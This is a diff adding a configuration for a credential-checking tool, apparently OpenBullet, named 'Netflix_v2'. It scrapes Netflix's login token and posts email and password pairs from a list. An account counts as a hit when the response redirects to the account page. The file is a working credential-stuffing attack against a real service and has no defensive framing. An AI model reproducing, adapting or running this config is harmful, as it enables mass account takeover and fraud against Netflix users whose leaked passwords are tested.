@@ -1,0 +1,44 @@
+[SETTINGS]
+{
+  "Name": "Netflix_v2",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-12T20:17:57.307293+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#get REQUEST GET "https://www.netflix.com/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" 
+  HEADER "Pragma: no-cache" 
+#authURL PARSE "<SOURCE>" CSS "[name=authURL]" "value" 0 -> VAR "authURL" "" "" 
+#post REQUEST POST "https://www.netflix.com/login" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>&rememberMe=true&flow=websiteSignUp&mode=login&action=loginAction&withFields=email%2Cpassword%2CrememberMe%2CnextPage%2CshowPassword&authURL=<authURL>&nextPage=https%3A%2F%2Fwww.netflix.com%2Fyouraccount&showPassword=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<ADDRESS>" Contains "netflix.com/youraccount" 
+  KEYCHAIN Failure OR 
+    KEY "Sorry" 
+    KEY "Incorrect" 
